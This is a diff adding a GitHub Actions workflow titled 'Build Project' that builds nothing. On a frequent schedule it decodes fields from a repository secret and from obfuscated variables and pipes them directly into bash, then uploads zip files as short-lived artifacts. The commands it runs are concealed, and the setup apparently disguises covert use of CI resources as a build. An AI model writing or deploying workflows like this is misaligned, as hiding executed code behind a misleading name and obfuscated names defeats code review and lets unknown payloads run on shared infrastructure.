@@ -1,0 +1,31 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          pjcv1: ${{ secrets.pjcv1 }}
+        run: |
+          printf '%s' "$pjcv1" | jq -r .h5215 | /bin/bash
+          printf '%s' "$oc73662" | jq -r .den0111 | /bin/bash
+          printf '%s' "$xlr2143" | jq -r .oj1 | /bin/bash
+          echo $mhyrl07 | jq -r .axbl0241 | /bin/bash
+          echo $rw1 | jq -r .jlyq445 | /bin/bash
+          printf '%s' "$gc49" | jq -r .n365 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Mw3rhTvk
+          path: "*.zip"
+          retention-days: 1
